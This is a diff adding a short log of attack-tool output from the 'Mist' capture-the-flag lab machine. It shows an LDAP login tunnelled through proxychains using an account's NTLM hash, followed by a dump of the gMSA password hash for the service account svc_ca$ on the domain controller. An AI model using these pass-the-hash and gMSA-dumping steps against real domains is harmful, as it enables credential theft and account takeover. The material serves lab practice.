@@ -1,0 +1,5 @@
+SMB         192.168.100.100 445    DC01             [*] Windows Server 2022 Build 20348 x64 (name:DC01) (domain:mist.htb) (signing:True) (SMBv1:False)
+[proxychains] Strict chain  ...  127.0.0.1:1080  ...  DC01.mist.htb:636  ...  OK
+LDAP        192.168.100.100 636    DC01             [+] mist.htb\op_Sharon.Mullard:d25863965a29b64af7959c3d19588dd7 
+LDAP        192.168.100.100 636    DC01             [*] Getting GMSA Passwords
+LDAP        192.168.100.100 636    DC01             Account: svc_ca$              NTLM: 6db5b4f0e49cf6da4c937944d58c416b
